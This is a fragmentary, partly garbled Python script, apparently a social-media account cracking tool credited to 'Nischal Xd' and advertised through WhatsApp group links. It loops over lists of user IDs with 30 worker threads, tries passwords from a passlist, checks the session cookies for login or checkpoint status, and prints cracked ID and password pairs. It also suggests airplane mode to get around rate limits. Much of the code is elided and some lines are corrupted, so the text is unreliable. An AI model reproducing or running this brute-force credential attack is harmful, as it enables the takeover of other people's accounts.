Join our watsapp:https://chat.whatsapp.com/DN5gBJnafyZAceDOQWrx4E
import os,re
from os import path
try:
	import requests
...
-----------------------------------
Join our watsapre
https://chat.whatsapp.com/DN5gBJnafyZAceDOQWrx4E
 Owner: Nischal Xd
 status: Trial
 Version: 3.0
...
def Main():
	clear_terminal()
	linguAbE"https://chat.whatsapp.com/EmEjy
	...
	if user=="1":
		...
		exit(" Thanks For Using My Tools ")
	else:
...
def file():
	...
	with tred(max_workers=30) as crack_submit:
		clear_terminal()
		print(' Total Ids: \033[1;32m'+str(len(fo)))
		print("\033[0;37m Process Is Running In Background \033[0;37m") 
		print(" use aeroplane mode for better result")
		linex()
		for user in fo:
	...
	try:
		...
		for pw in passlist:
			...
			if "checkpoint" in str(ses.cookies.get_dict()):
				...
				print('\r\r\033[1;32m [Nischal OK] '+ids+' | '+pas+'\033[1;37m')
